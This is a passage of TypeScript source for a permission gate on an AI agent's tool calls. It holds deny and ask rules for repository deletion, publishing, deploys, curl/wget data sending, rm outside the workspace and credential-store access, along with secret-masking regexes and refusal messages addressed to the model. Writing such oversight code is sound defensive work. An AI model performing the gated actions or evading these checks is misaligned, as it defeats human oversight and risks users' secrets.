    match: bash((w) => { const g = ghArgs(w); return g?.sub === "repo" && ["delete", "archive", "rename"].includes(g.args[0] ?? ""); }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "gh.api.danger",
    label: "A protected GitHub API write",
    match: bash((w) => {
      const g = ghArgs(w);
      if (g?.sub !== "api") return false;
      const m = httpMethod(g.args);
      if (!WRITE_METHOD(m)) return false;
      const path = g.args.find((a) => !a.startsWith("-") && !/^(GET|POST|PUT|PATCH|DELETE)$/i.test(a)) ?? "";
      return m === "DELETE" || /\/merge$|\/git\/refs|\/branches\/.*\/protection/.test(path);
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "gh.post",
    label: "Post on GitHub",
    match: bash((w) => {
      const g = ghArgs(w);
      if (g === null) return false;
      if ((g.sub === "issue" || g.sub === "pr") && ["comment", "create", "close", "edit", "review", "reopen", "ready", "lock"].includes(g.args[0] ?? "")) return true;
      if (g.sub === "repo" && g.args[0] === "create") return true;
      if (g.sub === "gist" && g.args[0] === "create") return true;
      if (g.sub === "release" && ["upload", "delete"].includes(g.args[0] ?? "")) return true;
      if (g.sub === "workflow" && g.args[0] === "run") return true;
      if (g.sub === "run" && g.args[0] === "rerun") return true;
      // gh api with a field/body argument defaults to POST even without an explicit method.
      return g.sub === "api" && (WRITE_METHOD(httpMethod(g.args)) || g.args.some((a) => /^(-f|-F|--field|--raw-field|--input|--data)/.test(a)));
    }),
    attended: "pass",
    unattended: "ask",
  },
  {
    id: "publish",
    label: "Publish a package or a release",
    match: bash((words) => {
      const d = deploySub(words);
      if (d && (d.tool === "npm" || d.tool === "pnpm" || d.tool === "yarn" || d.tool === "bun") && ["publish", "unpublish", "dist-tag", "deprecate"].includes(d.sub)) return true;
      const g = ghArgs(words);
      if (g?.sub === "release" && g.args[0] === "create") return true;
      return /^cargo publish\b|^twine upload\b|^gem push\b|^poetry publish\b/.test(words.join(" "));
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "deploy",
    label: "Deploy or change infrastructure",
    match: bash((words, text) => {
      const v = basename(words[0] ?? "");
      // vercel/netlify take the prod flag with or without a `deploy` subcommand, and promote/rollback also change prod.
      if (v === "vercel" || v === "netlify") return words.some((a) => a.startsWith("--prod") || a === "--target=production") || ["promote", "rollback"].includes(words[1] ?? "");
      const d = deploySub(words);
      if (d) {
        if (d.tool === "wrangler" && (["deploy", "publish"].includes(d.sub) || ["deploy", "publish"].includes(d.args[0] ?? ""))) return true;
        if (d.tool === "docker" && d.sub === "push") return true;
        if (d.tool === "kubectl" && ["apply", "delete", "scale", "rollout"].includes(d.sub)) return true;
        if (d.tool === "helm" && ["install", "upgrade", "uninstall"].includes(d.sub)) return true;
        if (d.tool === "terraform" && ["apply", "destroy"].includes(d.sub)) return true;
        if ((d.tool === "sam" || d.tool === "cdk") && d.sub === "deploy") return true;
        if (d.tool === "eas" && d.sub === "submit") return true;
        // aws/gcloud/az: a cheap write-verb heuristic over the subcommand words (create, sync, update-function-code, …).
        if ((d.tool === "aws" || d.tool === "gcloud" || d.tool === "az") && [d.sub, ...d.args].some((a) => [...DEPLOY_VERBS].some((verb) => a === verb || a.startsWith(`${verb}-`)))) return true;
      }
      return /^(?:fly|flyctl) deploy\b|^firebase deploy\b|^pulumi up\b/.test(text);
    }),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  { id: "secrets", label: "Set a secret", match: re(/^gh secret set\b|^vercel env add\b|^security add-/), attended: "ask", unattended: "ask", offerAlways: false },
  {
    id: "http.send",
    label: "Send data to a web service",
    match: bash((words) => {
      const v = basename(words[0] ?? "");
      if (v === "curl") return curlSends(words.slice(1));
      if (v === "wget") return wgetSends(words.slice(1));
      return false;
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "rm.outside",
    label: "Delete files outside its folder",
    match: bash((words, _, part, ctx) => {
      if (basename(words[0] ?? "") !== "rm") return false;
      const flags = words.slice(1).filter((w) => w.startsWith("-") && w !== "--");
      if (!flags.some((f) => f === "--recursive" || /^-[a-zA-Z]*[rR]/.test(f))) return false;
      return words.slice(1).some((w) => !w.startsWith("-") && outside(w, part.cwd, ctx));
    }),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "fs.outside",
    label: "Change files outside its folder",
    match: tool((call, ctx) => {
      if (!FILE_WRITES.has(call.tool)) return false;
      const path = call.input.file_path ?? call.input.notebook_path;
      return typeof path === "string" && outside(path, call.cwd, ctx);
    }),
    attended: "pass",
    unattended: "ask",
  },
  {
    id: "connector.act",
    label: "Act through a connector",
    match: tool((call) => isConnector(call)),
    attended: (p) => (p.kind === "call" && verbsOf(p.call).some((w) => WRITE_VERBS.has(w)) ? "ask" : "pass"),
    unattended: (p) => (p.kind === "call" && verbsOf(p.call).some((w) => READ_VERBS.has(w)) ? "pass" : "ask"),
  },
  { id: "claudio.create_bot", label: "Create a bot", match: tool((c) => isClaudio(c) && c.tool === claudio("create_bot")), attended: "pass", unattended: "ask" },
  { id: "claudio.start_agent", label: "Start a coding agent", match: tool((c) => isClaudio(c) && c.tool === claudio("start_agent")), attended: "pass", unattended: "ask" },
  {
    id: "claudio.routines",
    label: "Change routines",
    match: tool((c) => isClaudio(c) && (c.tool === claudio("set_routine") || c.tool === claudio("delete_routine"))),
    attended: "pass",
    unattended: "ask",
  },
];

/** A part's row: the cell for this initiator and the signature Always and Never cover. */
type Ruled = { row: Row; cell: Cell; signature: Signature; label: string };

const alwaysText = (label: string, isAttended: boolean) =>
  isAttended ? `${label}, without asking, in turns you start` : `${label}, without asking, in any turn, routines included`;

const deny = (via: DenyVia, rule: string, reason: string, handOff = false): Decision => ({ kind: "deny", via, rule, reason, handOff });

/**
 * Checks in this order, and fails closed: a matcher that throws is a deny naming its rule.
 *   1. floors: the bridge home (except the acting bot's own bots/<id>/ and USER.md; agents get no exception), a config
 *      file the bridge loads (self-escalation), SSH/GPG/cloud keys and the Keychain, browser profiles and cookies,
 *      cookie/login/key stores by name, stored credentials, password/payment/2FA entry (handOff). Paths match as
 *      written and on realpath; ancestors of a root count for recursive verbs and glob/$ words; the raw text is
 *      scanned for a root spelled literally; the bot's own absolute home path never matches the bridge floor.
 *   2. initiator bans: no set_routine / delete_routine in a routine chain (world.isRoutineChain); message_bot and
 *      create_bot at world.hopsOf >= 2; message_bot with no turn in flight.
 *   3. limits: headroom not ok; daily caps on create_bot and start_agent per bot.
 *   4. Never rules, on any part's signature.
 *   5. a one-shot grant with this actor and fingerprint (the gate consumes it).
 *   6. Always rules, by signature and attendance. Only a call whose every part is covered is allowed outright.
 *   7. the rule table, by attended(initiator). Bash is split into segments and the strictest segment wins.
 *   8. pass. The SDK's own Agent and SubagentHandback calls always pass.
 */
export function decide(call: ToolCall, ctx: PolicyContext): Decision {
  if (SDK_INTERNAL.has(call.tool)) return PASS;
  const at: { via: DenyVia; rule: string } = { via: "floor", rule: "floor.paths" };
  try {
    const view = viewOf(call, ctx);
    for (const floor of FLOORS) {
      at.rule = floor.id;
      if (floorHit(floor, call, view, ctx)) return deny("floor", floor.id, floorReason(floor), floor.handOff ?? false);
    }

    at.via = "initiator";
    for (const ban of BANS) {
      at.rule = ban.id;
      if (ban.tools.includes(call.tool) && ban.applies(ctx.initiator)) return deny("initiator", ban.id, ban.reason);
    }

    at.via = "limit";
    at.rule = "limit";
    const limited = limitOf(call, ctx);
    if (limited) return limited;

    at.via = "rule";
    const isAttended = attended(ctx.initiator);
    const ruled = view.parts.map((part): Ruled | null => {
      for (const row of TABLE) {
        at.rule = row.id;
        if (row.match(part, ctx)) {
          const subject = part.kind === "call" && isConnector(part.call) ? `${row.label}: ${mcpName(part.call.tool)}` : row.label;
          const toolName = part.kind === "bash" ? "Bash" : part.call.tool;
          const cellOf = isAttended ? row.attended : row.unattended;
          return { row, cell: typeof cellOf === "function" ? cellOf(part, ctx) : cellOf, signature: `${toolName}:${row.id}` as Signature, label: subject };
        }
      }
      return null;
    });

    at.via = "never";
    at.rule = "rules";
    for (const r of ruled) {
      const never = r && ctx.rules.find((s) => s.decision === "deny" && s.signature === r.signature);
      if (never) return deny("never", never.signature, `The user said never to this (${never.label}). It did not run. Do not try it or anything equivalent, now or later.`);
    }

    const print = fingerprint(call);
    const key = actorKey(ctx.actor);
    const grant = ctx.grants.find((g) => g.actor === key && g.fingerprint === print && g.expiresAt > ctx.now);
    if (grant) return { kind: "allow", via: "grant", rule: print, cardId: grant.cardId };

    const covering = (r: Ruled | null) =>
      r === null ? undefined : ctx.rules.find((s) => s.decision === "allow" && s.signature === r.signature && (s.appliesTo === "all" || isAttended));
    const covers = ruled.map(covering);
    const first = covers[0];
    if (first && covers.every((c) => c !== undefined)) return { kind: "allow", via: "always", rule: first.signature, cardId: first.cardId };

    const held = ruled.find((r, i) => r !== null && r.cell === "ask" && covers[i] === undefined);
    if (held) return { kind: "ask", rule: held.row.id, label: held.label, signature: held.signature, always: alwaysText(held.label, isAttended), offerAlways: held.row.offerAlways ?? true };
    return PASS;
  } catch {
    return deny(at.via, at.rule, `The bridge could not check this call against ${at.rule}, so it was blocked and did not run. Do not retry it this turn.`);
  }
}

const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");

function sorted(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(sorted);
  if (isRecord(value)) return Object.fromEntries(Object.keys(value).sort().map((k) => [k, sorted(value[k])]));
  return value;
}

/** Tool plus a hash of the meaningful input. Bash: the command only. Write: path and content. MCP: the whole input. */
export function fingerprint(call: ToolCall): Fingerprint {
  const meaningful = call.tool === "Bash" ? String(call.input.command).trim() : JSON.stringify(sorted(call.input));
  return `${call.tool}:${sha256(meaningful).slice(0, 32)}` as Fingerprint;
}

const SECRET_PATTERNS: readonly RegExp[] = [
  /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)/g,
  /\bsk-[A-Za-z0-9_-]{16,}/g,
  /\bgh[pousr]_[A-Za-z0-9]{20,}/g,
  /\bgithub_pat_[A-Za-z0-9_]{20,}/g,
  /\bxox[abprs]-[A-Za-z0-9-]{10,}/g,
  /\bAKIA[0-9A-Z]{16}\b/g,
  /\bAIza[0-9A-Za-z_-]{35}\b/g,
  /\b[sprk]k_(?:live|test)_[A-Za-z0-9]{16,}/g,
  /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
];
/** A keyword (any `[\w-]*` prefix allowed, so AWS_SECRET_ACCESS_KEY= and MY_TOKEN= match) then its value after = or :. */
const KEYED_SECRET = /(\b(?:Bearer|Basic|token)\s+|\b[\w-]*(?:password|passwd|pwd|secret|token|access[_-]?key|api[_-]?key|client[_-]?secret)["']?\s*[=:]\s*["']?)([^\s"'&,;]{3,})/gi;
/** A URL's user:password, curl's -u user:pass, and mysql's -p<password>. The value is masked; the user is kept. */
const URL_CREDENTIAL = /(:\/\/[^\s:/@]+:)([^\s@/]+)(@)/g;
const CURL_USER = /((?:-u|--user)\s+[^\s:]+:)(\S+)/g;
const MYSQL_PASSWORD = /(^|\s)(-p)([^\s]{2,})/g;
/** A long run mixing upper case, lower case and digits looks like a key. Commit SHAs (lower-case hex) do not. */
const LONG_RUN = /[A-Za-z0-9+_=-]{32,}/g;

const masked = (n: number) => `«redacted:${n} chars»`;

/** Secret-shaped substrings become «redacted:N chars». Keyed rules run first so a keyed value is masked once, not twice. */
function mask(text: string): string {
  let out = text;
  out = out.replace(KEYED_SECRET, (_, lead: string, value: string) => lead + masked(value.length));
  out = out.replace(URL_CREDENTIAL, (_, lead: string, value: string, tail: string) => lead + masked(value.length) + tail);
  out = out.replace(CURL_USER, (_, lead: string, value: string) => lead + masked(value.length));
  out = out.replace(MYSQL_PASSWORD, (_, pre: string, flag: string, value: string) => pre + flag + masked(value.length));
  for (const p of SECRET_PATTERNS) out = out.replace(p, (m) => masked(m.length));
  return out.replace(LONG_RUN, (m) => (/[a-z]/.test(m) && /[A-Z]/.test(m) && /[0-9]/.test(m) ? masked(m.length) : m));
}

const lines = (s: string) => (s === "" ? 0 : s.split("\n").length - (s.endsWith("\n") ? 1 : 0));
const CLIP = 4096;
const clip = (s: string, n: number) => (s.length <= n ? s : `${s.slice(0, n)}… (${s.length - n} more chars)`);

/** The card's detail line: the exact command, "Write <path> (N lines)", or an MCP tool with compact JSON. Secrets masked. */
export function detailOf(call: ToolCall): string {
  const i = call.input;
  switch (call.tool) {
    case "Bash":
      return clip(mask(String(i.command).trim()), CLIP);
    case "Write":
      return mask(`Write ${String(i.file_path)} (${lines(String(i.content))} lines)`);
    case "Edit":
    case "MultiEdit":
      return mask(`${call.tool} ${String(i.file_path)}`);
    case "NotebookEdit":
      return mask(`NotebookEdit ${String(i.notebook_path)}`);
    default:
      return clip(mask(`${call.tool} ${JSON.stringify(i)}`), 500);
  }
}

const BODY_KEYS = new Set(["content", "old_string", "new_string", "new_source"]);
/** A key whose value is a secret by its name alone, however short the value. */
const SECRET_KEY = /secret|token|password|passwd|passcode|api.?key|access.?key|authorization|cookie|credential|otp|totp|cvv|cvc|card.?number|private.?key|client.?secret/i;

function redactAt(value: unknown, key: string | null): unknown {
  if (typeof value === "string") {
    if (key !== null && BODY_KEYS.has(key)) return { bytes: Buffer.byteLength(value, "utf8"), sha256: sha256(value) };
    if (key !== null && SECRET_KEY.test(key)) return masked(value.length);
    return clip(mask(value), CLIP);
  }
  if (Array.isArray(value)) return value.map((v) => redactAt(v, key));
  if (isRecord(value)) return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, redactAt(v, k)]));
  return value;
}

/** For audit rows. Secret-shaped strings become «redacted:N chars», file bodies {bytes, sha256}, long strings clipped. */
export function redact(input: unknown): unknown {
  return redactAt(input, null);
}
